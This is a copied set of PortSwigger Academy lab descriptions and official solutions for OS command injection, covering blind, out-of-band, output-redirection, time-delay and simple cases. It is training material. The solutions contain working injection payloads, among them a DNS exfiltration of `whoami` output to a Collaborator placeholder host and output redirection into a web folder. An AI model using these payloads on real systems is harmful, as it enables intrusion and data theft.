# PortSwigger labs: os command injection

> Copied from <https://portswigger.net/web-security/os-command-injection>. Questions and answers are the source's own; nothing was answered or rewritten here.


## 1. Blind OS command injection with out-of-band data exfiltration

[Open the lab](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, execute the `whoami` command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab.

#### Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

<details><summary>Official solution</summary>

1. Use Burp Suite Professional to intercept and modify the request that submits feedback.
2. Go to the [Collaborator](/burp/documentation/desktop/tools/collaborator) tab.
3. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
4. Modify the `email` parameter, changing it to something like the following, but insert your Burp Collaborator subdomain where indicated:

   `` email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN|| ``
5. Go back to the Collaborator tab, and click "Poll now". You should see some DNS interactions that were initiated by the application as the result of your payload. If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously.
6. Observe that the output from your command appears in the subdomain of the interaction, and you can view this within the Collaborator tab. The full domain name that was looked up is shown in the Description tab for the interaction.
7. To complete the lab, enter the name of the current user.

</details>

<details><summary>Community solutions</summary>

##### Rana Khalil

https://www.youtube.com/watch?v=oAYwt19DlGw

##### Michael Sommer

https://www.youtube.com/watch?v=SliqOK3RgEA

</details>


## 2. Blind OS command injection with out-of-band interaction

[Open the lab](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator.

#### Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

<details><summary>Official solution</summary>

1. Use Burp Suite to intercept and modify the request that submits feedback.
2. Modify the `email` parameter, changing it to:

   `email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`
3. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified `email` parameter.

#### Note

The solution described here is sufficient simply to trigger a DNS lookup and so solve the lab. In a real-world situation, you would use [Burp Collaborator](/burp/documentation/desktop/tools/collaborator) to verify that your payload had indeed triggered a DNS lookup. See the lab on [blind OS command injection with out-of-band data exfiltration](/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration) for an example of this.

</details>

<details><summary>Community solutions</summary>

##### Rana Khalil

https://www.youtube.com/watch?v=GUT03VBj7Vc

##### Michael Sommer

https://www.youtube.com/watch?v=ocqIy3zsZgo

</details>


## 3. Blind OS command injection with output redirection

[Open the lab](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:

`/var/www/images/`

The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.

To solve the lab, execute the `whoami` command and retrieve the output.

<details><summary>Official solution</summary>

1. Use Burp Suite to intercept and modify the request that submits feedback.
2. Modify the `email` parameter, changing it to:

   `email=||whoami>/var/www/images/output.txt||`
3. Now use Burp Suite to intercept and modify the request that loads an image of a product.
4. Modify the `filename` parameter, changing the value to the name of the file you specified for the output of the injected command:

   `filename=output.txt`
5. Observe that the response contains the output from the injected command.

</details>

<details><summary>Community solutions</summary>

##### Rana Khalil

https://www.youtube.com/watch?v=4Wl9Ap8cmqQ

##### Michael Sommer

https://www.youtube.com/watch?v=Cocf02tBZak

</details>


## 4. Blind OS command injection with time delays

[Open the lab](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.

To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.

<details><summary>Official solution</summary>

1. Use Burp Suite to intercept and modify the request that submits feedback.
2. Modify the `email` parameter, changing it to:

   `email=x||ping+-c+10+127.0.0.1||`
3. Observe that the response takes 10 seconds to return.

</details>

<details><summary>Community solutions</summary>

##### Rana Khalil

https://www.youtube.com/watch?v=YHQXfPWo1vI

##### Michael Sommer

https://www.youtube.com/watch?v=sclkGjfyzLc

</details>


## 5. OS command injection, simple case

[Open the lab](https://portswigger.net/web-security/os-command-injection/lab-simple)

This lab contains an OS command injection vulnerability in the product stock checker.

The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.

To solve the lab, execute the `whoami` command to determine the name of the current user.

<details><summary>Official solution</summary>

1. Use Burp Suite to intercept and modify a request that checks the stock level.
2. Modify the `storeID` parameter, giving it the value `1|whoami`.
3. Observe that the response contains the name of the current user.

</details>

<details><summary>Community solutions</summary>

##### Rana Khalil

https://www.youtube.com/watch?v=GDUadTiXXVk

##### z3nsh3ll

https://www.youtube.com/watch?v=fyloiMlGNFI

##### Michael Sommer

https://www.youtube.com/watch?v=clUDnn66BR8

</details>

